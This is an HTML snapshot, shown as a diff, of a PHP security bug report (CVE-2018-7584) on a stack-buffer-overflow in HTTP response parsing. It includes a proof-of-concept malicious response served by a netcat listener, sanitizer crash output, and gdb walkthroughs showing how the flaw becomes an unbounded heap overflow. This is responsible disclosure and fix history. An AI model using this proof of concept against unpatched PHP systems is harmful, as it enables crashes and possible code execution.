@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='HTTP related Bug #75981 - RDF' href='rss/bug.php?id=75981'>
+        <link rel='alternate' type='application/rss+xml' title='HTTP related Bug #75981 - RSS 2.0' href='rss/bug.php?id=75981&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #75981 :: stack-buffer-overflow while parsing HTTP response</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=75981">Sec Bug</a>&nbsp;#75981</th>
+            <td id="summary" colspan="5">stack-buffer-overflow while parsing HTTP response</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2018-02-20 01:44 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2018-04-16 16:10 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>l &#x64;&#111;&#x74; wei &#x61;&#116; ntu &#x64;&#111;&#x74; edu &#x64;&#111;&#x74; sg</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=HTTP+related">HTTP related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.6.33</td>
+            <th class="details">OS:</th>
+            <td>*</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7584" target="_blank">2018-7584</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=75981&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=75981&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=75981&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1519091072">&nbsp;</a><strong>[2018-02-20 01:44 UTC] l &#x64;&#111;&#x74; wei &#x61;&#116; ntu &#x64;&#111;&#x74; edu &#x64;&#111;&#x74; sg</strong>
+<pre class='note'>Description:
+------------
+The latest PHP distributions contain a memory corruption bug while parsing malformed HTTP response packets. Vulnerable code at:
+
+php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723
+
+			if (tmp_line[tmp_line_len - 1] == '\n') {
+				--tmp_line_len;
+				if (tmp_line[tmp_line_len - 1] == '\r') {
+					--tmp_line_len;
+				}
+}
+
+If the proceeding buffer contains '\r' as either controlled content or junk on stack, under a realistic setting (non-ASAN), tmp_line_len could go do -1, resulting in an extra large string being copied subsequently. Under ASAN a segfault can be observed.
+
+$ bin/php --version
+PHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )
+Copyright (c) 1997-2018 The PHP Group
+Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
+
+
+Test script:
+---------------
+$ xxd -g 1 poc
+0000000: 30 30 30 30 30 30 30 30 30 31 30 30 0a 0a        000000000100..
+
+$ nc -vvlp 8080 &lt; poc
+Listening on [0.0.0.0] (family 0, port 8080)
+Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)
+GET / HTTP/1.0
+Host: localhost:8080
+Connection: close
+
+$ bin/php -r 'file_get_contents(&quot;<a href="http://localhost:8080&quot;" rel="nofollow">http://localhost:8080&quot;</a>);'
+
+Expected result:
+----------------
+NO CRASH
+
+Actual result:
+--------------
+$ bin/php -r 'file_get_contents(&quot;<a href="http://localhost:8080&quot;" rel="nofollow">http://localhost:8080&quot;</a>);'
+=================================================================
+==26249== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xbfc038ef at pc 0x8aa393b bp 0xbfc02eb8 sp 0xbfc02eac
+READ of size 1 at 0xbfc038ef thread T0
+    #0 0x8aa393a in php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723
+    #1 0x8aa61fb in php_stream_url_wrap_http /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:979
+    #2 0x8b8b115 in _php_stream_open_wrapper_ex /home/weilei/php-7.2.2/main/streams/streams.c:2027
+    #3 0x8918dc0 in zif_file_get_contents /home/weilei/php-7.2.2/ext/standard/file.c:550
+    #4 0x867993a in phar_file_get_contents /home/weilei/php-7.2.2/ext/phar/func_interceptors.c:224
+    #5 0x91ee267 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:573
+    #6 0x91ee267 in execute_ex /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:59731
+    #7 0x923c13c in zend_execute /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:63760
+    #8 0x8cba975 in zend_eval_stringl /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1082
+    #9 0x8cbaf66 in zend_eval_stringl_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1123
+    #10 0x8cbb06b in zend_eval_string_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1134
+    #11 0x9244455 in do_cli /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1042
+    #12 0x9246b37 in main /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1404
+    #13 0xb5e8ca82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)
+    #14 0x80656d0 in _start (/home/weilei/php7_asan/bin/php+0x80656d0)
+Address 0xbfc038ef is located at offset 607 in frame &lt;php_stream_url_wrap_http_ex&gt; of T0's stack:
+  This frame has 13 object(s):
+    [32, 36) 'transport_string'
+    [96, 100) 'errstr'
+    [160, 164) 'http_header_line_length'
+    [224, 232) 'timeout'
+    [288, 296) 'req_buf'
+    [352, 360) 'tmpstr'
+    [416, 432) 'ssl_proxy_peer_name'
+    [480, 496) 'http_header'
+    [544, 576) 'buf'
+    [608, 736) 'tmp_line'
+    [768, 1792) 'location'
+    [1824, 2848) 'new_path'
+    [2880, 3904) 'loc_path'
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723 php_stream_url_wrap_http_ex
+Shadow bytes around the buggy address:
+  0x37f806c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f806d0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4
+  0x37f806e0: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4
+  0x37f806f0: f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f2 f2 f2 f2 00 f4
+  0x37f80700: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00
+=&gt;0x37f80710: f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00
+  0x37f80720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2
+  0x37f80730: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f80740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f80750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x37f80760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:     fa
+  Heap righ redzone:     fb
+  Freed Heap region:     fd
+  Stack left redzone:    f1
+  Stack mid redzone:     f2
+  Stack right redzone:   f3
+  Stack partial redzone: f4
+  Stack after return:    f5
+  Stack use after scope: f8
+  Global redzone:        f9
+  Global init order:     f6
+  Poisoned by user:      f7
+  ASan internal:         fe
+==26249== ABORTING
+Aborted
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=75981'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=75981'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1519167923">&nbsp;</a><strong>[2018-02-20 23:05 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID:      needed</span>
+</div></div></div><div class='comment type_comment' ><a name="1519167923">&nbsp;</a><strong>[2018-02-20 23:05 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Yep, seems to be a bug, tmp_line_len is not checked before taking -1, and in fact from code above (in switch) it looks like it can very well be zero when we are using tmp_line_len - 1.
+</pre>
+</div><div class='comment type_log' ><a name="1519169142">&nbsp;</a><strong>[2018-02-20 23:25 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-PHP Version: 7.2.2</span>
+<span class="added">+PHP Version: 5.6.33</span>
+</div></div></div><div class='comment type_comment' ><a name="1519170443">&nbsp;</a><strong>[2018-02-20 23:47 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>The fix is in security repo as 36239fee3638a8f4cfe3ca3aba597cb1699abd90 and in <a href="https://gist.github.com/2b41efaf052435efb511f499769fc023" rel="nofollow">https://gist.github.com/2b41efaf052435efb511f499769fc023</a>
+
+Please verify.
+</pre>
+</div><div class='comment type_comment' ><a name="1519178819">&nbsp;</a><strong>[2018-02-21 02:06 UTC] l &#x64;&#111;&#x74; wei &#x61;&#116; ntu &#x64;&#111;&#x74; edu &#x64;&#111;&#x74; sg</strong>
+<pre class='note'>The length check works for my repros. I've been using a weaker check - only to the '\r' line, it seems also working fine, due to the php_stream_{eof, get_line} guarding the block. The OOB access occurred when tmp_line_len is 0 at the '\r' strip check. 
+
+Please credit to:
+Wei Lei and Liu Yang of Nanyang Technological University.
+
+Thanks for the quick fix!
+</pre>
+</div><div class='comment type_log' ><a name="1519717868">&nbsp;</a><strong>[2018-02-27 07:51 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1519747637">&nbsp;</a><strong>[2018-02-27 16:07 UTC] <a href="//people.php.net/pollita">pollita@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7cf491b661ee57a11b79f99416c6296bae2f27a0" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7cf491b661ee57a11b79f99416c6296bae2f27a0</a>
+Log: Fix <a href='bug.php?id=75981'>bug #75981</a>: prevent reading beyond buffer start
+</pre>
+</div><div class='comment type_svn' ><a name="1519815726">&nbsp;</a><strong>[2018-02-28 11:02 UTC] <a href="//people.php.net/krakjoe">krakjoe@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=51fe6b9ebfb9098780b8c50fef50d332cf21480f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=51fe6b9ebfb9098780b8c50fef50d332cf21480f</a>
+Log: Fix <a href='bug.php?id=75981'>bug #75981</a>: prevent reading beyond buffer start
+</pre>
+</div><div class='comment type_log' ><a name="1519929826">&nbsp;</a><strong>[2018-03-01 18:43 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID: needed</span>
+<span class="added">+CVE-ID: 2018-7584</span>
+</div></div></div><div class='comment type_comment' ><a name="1520312755">&nbsp;</a><strong>[2018-03-06 05:05 UTC] l &#x64;&#111;&#x74; wei &#x61;&#116; ntu &#x64;&#111;&#x74; edu &#x64;&#111;&#x74; sg</strong>
+<pre class='note'>The bug can be manipulated to achieve an unbounded memcpy from the stack to a small heap buffer. On Linux, this would result in a DoS when the src of memcpy reaches stack top; on Windows, control flow hijacking may be possible if a SIGSEGV handler can be overwritten before the memcpy crashes once reaching stack or heap boundary.
+
+*** To overcome the web-bugs spam filter, replaced all &quot;<a href="http://&quot;" rel="nofollow">http://&quot;</a> to &quot;hxxp://&quot; below. Life is hard.. ***
+
+$ nc -vvlp 8888 &lt; poc
+
+$ gdb --args bin/php -r 'file_get_contents(&quot;hxxp://localhost:8888&quot;);' 
+
+(gdb) b main
+Breakpoint 1 at 0x865ef67: file /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c, line 1216.
+
+(gdb) r
+Starting program: /home/weilei/php7_gdb/bin/php -r file_get_contents\(\&quot;hxxp://localhost:8888\&quot;\)\;
+
+Breakpoint 1, main (argc=3, argv=0xbfffe9c4) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1216
+1216		int exit_status = SUCCESS;
+
+(gdb) b http_fopen_wrapper.c:721
+Breakpoint 2 at 0x8424276: file /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c, line 721.
+
+(gdb) c
+Continuing.
+
+Breakpoint 2, php_stream_url_wrap_http_ex (wrapper=0x8d5c0ac &lt;php_stream_http_wrapper&gt;, path=0x8e7cb20 &quot;<a href="http://localhost:8888&quot;" rel="nofollow">http://localhost:8888&quot;</a>, mode=0x8c4a516 &quot;rb&quot;, options=0, opened_path=0x0, context=0x8e74970, 
+    redirect_max=20, flags=1, response_header=0xbfffb9b0) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:721
+721				if (tmp_line[tmp_line_len - 1] == '\n') {
+
+(gdb) x/10wx tmp_line
+0xbfffaccc:	0x3030000a	0x30303030	0x30303130	0x0000000a
+0xbfffacdc:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffacec:	0x00000000	0x00000000
+
+// *** Pre-condition of the large copy: tmp_line[-1] == 0x0d
+// With the zend allocator, it is relatively easier to control the value of tmp_line[-1] to be '\r':
+
+722					--tmp_line_len;
+(gdb) p tmp_line_len
+$2 = 1
+
+(gdb) n
+723					if (tmp_line[tmp_line_len - 1] == '\r') {
+
+(gdb) p tmp_line_len
+$3 = 0
+
+// If customised heap allocator is configured for the PHP build, more investigation is needed.
+// On both Linux and Windows, the default configuration is the Zend allocator. For now:
+
+(gdb) set *((char*)tmp_line - 1) = '\r'
+
+(gdb) x/10bx tmp_line
+0xbfffaccc:	0x0a	0x00	0x30	0x30	0x30	0x30	0x30	0x30
+0xbfffacd4:	0x30	0x31
+
+(gdb) x/10bx tmp_line - 8
+0xbfffacc4:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x0d
+0xbfffaccc:	0x0a	0x00
+
+(gdb) n
+724						--tmp_line_len;
+(gdb) n
+727				ZVAL_STRINGL(&amp;http_response, tmp_line, tmp_line_len);
+
+(gdb) p/x tmp_line_len 
+$5 = 0xffffffff
+
+// http_response is a new zval structure declared on the stack, step into line 727
+// a zend_string will be allocated, due to addition of a header and subsequent calls
+// to _ZSTR_STRUCT_SIZE(len) and ZEND_MM_ALIGNED_SIZE(), the allocation size wraps to
+// 16 bytes on the heap.
+
+(gdb) s
+zend_string_init (persistent=0, len=4294967295, str=0xbfffaccc &quot;\n&quot;) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:727
+727				ZVAL_STRINGL(&amp;http_response, tmp_line, tmp_line_len);
+
+(gdb) s
+zend_string_alloc (persistent=0, len=4294967295) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:134
+134		zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);
+
+(gdb) p len
+$9 = 4294967295
+
+(gdb) s
+_emalloc (size=16) at /home/weilei/php-7.2.2-release/Zend/zend_alloc.c:2425
+2425		if (UNEXPECTED(AG(mm_heap)-&gt;use_custom_heap)) {
+(gdb) s
+2429				return AG(mm_heap)-&gt;custom_heap.std._malloc(size);
+(gdb) p size
+$10 = 16
+(gdb) finish
+Run till exit from #0  _emalloc (size=16) at /home/weilei/php-7.2.2-release/Zend/zend_alloc.c:2429
+0x08424336 in zend_string_alloc (persistent=0, len=4294967295) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:134
+134		zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);
+Value returned is $11 = (void *) 0x8e7cf80
+
+// after a few source line stepping:
+
+(gdb) n
+172		memcpy(ZSTR_VAL(ret), str, len);
+
+(gdb) p len
+$17 = 4294967295
+
+(gdb) p/x *ret
+$18 = {gc = {refcount = 0x1, u = {v = {type = 0x6, flags = 0x0, gc_info = 0x0}, type_info = 0x6}}, h = 0x0, len = 0xffffffff, val = {0x18}}
+
+(gdb) x/s str
+0xbfffaccc:	&quot;\n&quot;
+
+(gdb) s
+__memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:111
+111	../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S: No such file or directory.
+(gdb) bt
+#0  __memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:111
+#1  0x084243bf in zend_string_init (persistent=0, len=4294967295, str=0xbfffaccc &quot;\n&quot;) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:172
+#2  php_stream_url_wrap_http_ex (wrapper=0x8d5c0ac &lt;php_stream_http_wrapper&gt;, path=0x8e7cb20 &quot;hxxp://localhost:8888&quot;, mode=0x8c4a516 &quot;rb&quot;, options=0, opened_path=0x0, context=0x8e74970, redirect_max=20, 
+    flags=1, response_header=0xbfffb9b0) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:727
+#3  0x08425594 in php_stream_url_wrap_http (wrapper=0x8d5c0ac &lt;php_stream_http_wrapper&gt;, path=0x8e7cb20 &quot;hxxp://localhost:8888&quot;, mode=0x8c4a516 &quot;rb&quot;, options=0, opened_path=0x0, context=0x8e74970)
+    at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:979
+#4  0x0847b77f in _php_stream_open_wrapper_ex (path=0x8e7cb20 &quot;hxxp://localhost:8888&quot;, mode=0x8c4a516 &quot;rb&quot;, options=8, opened_path=0x0, context=0x8e74970)
+    at /home/weilei/php-7.2.2-release/main/streams/streams.c:2027
+#5  0x08388a60 in zif_file_get_contents (execute_data=0xb79ed068, return_value=0xbfffd300) at /home/weilei/php-7.2.2-release/ext/standard/file.c:550
+#6  0x082a42d0 in phar_file_get_contents (execute_data=0xb79ed068, return_value=0xbfffd300) at /home/weilei/php-7.2.2-release/ext/phar/func_interceptors.c:224
+#7  0x08647e4a in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER () at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:573
+#8  execute_ex (ex=0xb79ed028) at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:59731
+#9  0x0865b6a9 in zend_execute (op_array=0x8e7cb40, return_value=0xbfffd474) at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:63760
+#10 0x084da344 in zend_eval_stringl (str=0x8d859a0 &quot;file_get_contents(\&quot;hxxp://localhost:8888\&quot;);&quot;, str_len=43, retval_ptr=0x0, string_name=0x8cdc728 &quot;Command line code&quot;)
+    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1082
+#11 0x084da53e in zend_eval_stringl_ex (str=0x8d859a0 &quot;file_get_contents(\&quot;hxxp://localhost:8888\&quot;);&quot;, str_len=43, retval_ptr=0x0, string_name=0x8cdc728 &quot;Command line code&quot;, handle_exceptions=1)
+    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1123
+#12 0x084da5a6 in zend_eval_string_ex (str=0x8d859a0 &quot;file_get_contents(\&quot;hxxp://localhost:8888\&quot;);&quot;, retval_ptr=0x0, string_name=0x8cdc728 &quot;Command line code&quot;, handle_exceptions=1)
+    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1134
+#13 0x0865e5e0 in do_cli (argc=3, argv=0x8d85950) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1042
+#14 0x0865f53c in main (argc=3, argv=0x8d85950) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1404
+
+(gdb) x/8wx $esp
+0xbfffa4cc:	0x084243bf	0x08e7cf90	0xbfffaccc	0xffffffff
+0xbfffa4dc:	0xbfffa59c	0x00000000	0xbfffac9c	0x08e74970
+
+// would result in memcpy(0x08e7cf90, 0xbfffaccc, 0xffffffff);
+
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+__memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:1284
+1284	in ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S
+
+(gdb) info reg
+eax            0xbfffffec	-1073741844
+ecx            0xffffac5f	-21409
+edx            0x8e822b0	149430960
+ebx            0xb7e02000	-1210048512
+esp            0xbfffa4c8	0xbfffa4c8
+ebp            0xbfffb968	0xbfffb968
+esi            0xb79ed028	-1214328792
+edi            0x8e7cc20	149408800
+eip            0xb7d8c497	0xb7d8c497 &lt;__memcpy_ssse3_rep+3431&gt;
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/10i $eip
+=&gt; 0xb7d8c497 &lt;__memcpy_ssse3_rep+3431&gt;:	movdqu 0x10(%eax),%xmm1
+   0xb7d8c49c &lt;__memcpy_ssse3_rep+3436&gt;:	movdqu 0x20(%eax),%xmm2
+   0xb7d8c4a1 &lt;__memcpy_ssse3_rep+3441&gt;:	movdqu 0x30(%eax),%xmm3
+   0xb7d8c4a6 &lt;__memcpy_ssse3_rep+3446&gt;:	movdqu 0x40(%eax),%xmm4
+   0xb7d8c4ab &lt;__memcpy_ssse3_rep+3451&gt;:	movdqu 0x50(%eax),%xmm5
+   0xb7d8c4b0 &lt;__memcpy_ssse3_rep+3456&gt;:	movdqu 0x60(%eax),%xmm6
+   0xb7d8c4b5 &lt;__memcpy_ssse3_rep+3461&gt;:	movdqu 0x70(%eax),%xmm7
+   0xb7d8c4ba &lt;__memcpy_ssse3_rep+3466&gt;:	lea    0x80(%eax),%eax
+   0xb7d8c4c0 &lt;__memcpy_ssse3_rep+3472&gt;:	lfence 
+   0xb7d8c4c3 &lt;__memcpy_ssse3_rep+3475&gt;:	sub    $0x80,%ecx
+</pre>
+</div><div class='comment type_comment' ><a name="1520415226">&nbsp;</a><strong>[2018-03-07 09:33 UTC] l &#x64;&#111;&#x74; wei &#x61;&#116; ntu &#x64;&#111;&#x74; edu &#x64;&#111;&#x74; sg</strong>
+<pre class='note'>Correction: the tmp_line[] array is on the stack, hence the pre-condition is determined by attacker's ability to control the byte tmp_line[-1] on stack. Under an -O0 build of PHP-7.2.2 on Ubuntu Linux, the preceding buffer of tmp_line is a zval structure of 16 bytes, defined in Zend/zend_types.h :
+
+struct _zval_struct {
+    zend_value        value;            /* value */
+    union {
+        struct {
+            ZEND_ENDIAN_LOHI_4(
+                zend_uchar    type,         /* active type */
+                zend_uchar    type_flags,
+                zend_uchar    const_flags,
+                zend_uchar    reserved)     /* call info for EX(This) */
+        } v;
+        uint32_t type_info;
+    } u1;
+    union {
+        uint32_t     next;                 /* hash collision chain */
+        uint32_t     cache_slot;           /* literal cache slot */
+        uint32_t     lineno;               /* line number (for ast nodes) */
+        uint32_t     num_args;             /* arguments number for EX(This) */
+        uint32_t     fe_pos;               /* foreach position */
+        uint32_t     fe_iter_idx;          /* foreach iterator index */
+        uint32_t     access_flags;         /* class constant access flags */
+        uint32_t     property_guard;       /* single property guard */
+        uint32_t     extra;                /* not further specified */
+    } u2;
+};
+
+The zval structure for http_response declared in http_fopen_wrapper.c :
+
+668     if (php_stream_get_line(stream, tmp_line, sizeof(tmp_line) - 1, &amp;tmp_line_len) != NULL) {
+669         zval http_response;
+670
+671         if (tmp_line_len &gt; 9) {
+672             response_code = atoi(tmp_line + 9);
+673         } else {
+674             response_code = 0;
+675         }
+676         if (context &amp;&amp; NULL != (tmpzval = php_stream_context_get_option(context, &quot;http&quot;, &quot;ignore_errors&quot;))) {
+677             ignore_errors = zend_is_true(tmpzval);
+678         }
+
+SInce the zval structure is not initialized yet before the pre-condition check at line 723 and initialization of http_response at line 727:
+
+721         if (tmp_line[tmp_line_len - 1] == '\n') {
+722             --tmp_line_len;
+723             if (tmp_line[tmp_line_len - 1] == '\r') {
+724                 --tmp_line_len;
+725             }
+726         }
+727         ZVAL_STRINGL(&amp;http_response, tmp_line, tmp_line_len);
+
+We can conclude that the byte at tmp_line[-1] is located on uninitialized stack, therefore an attacker can control this byte by preparing additional calls to flush the byte to '\x0d' before triggering this vulnerability to arrive at an unbounded heap overflow.
+</pre>
+</div><div class='comment type_comment' ><a name="1523885616">&nbsp;</a><strong>[2018-04-16 13:33 UTC] mimipim &#x61;&#116; abv &#x64;&#111;&#x74; bg</strong>
+<pre class='note'>It seem to be still active bug. However I am unable to provide any useful information at this time.
+</pre>
+</div><div class='comment type_comment' ><a name="1523895033">&nbsp;</a><strong>[2018-04-16 16:10 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Could you explain what you mean by &quot;active bug&quot;? Can you still reproduce the issue with the fix applied? If so, please provide reproduction scenario.
+</pre>
+</div><div class='comment type_svn' ><a name="1524543894">&nbsp;</a><strong>[2018-04-24 04:24 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=36239fee3638a8f4cfe3ca3aba597cb1699abd90" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=36239fee3638a8f4cfe3ca3aba597cb1699abd90</a>
+Log: Fix <a href='bug.php?id=75981'>bug #75981</a>: prevent reading beyond buffer start
+</pre>
+</div><div class='comment type_svn' ><a name="1524546631">&nbsp;</a><strong>[2018-04-24 05:10 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=36239fee3638a8f4cfe3ca3aba597cb1699abd90" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=36239fee3638a8f4cfe3ca3aba597cb1699abd90</a>
+Log: Fix <a href='bug.php?id=75981'>bug #75981</a>: prevent reading beyond buffer start
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
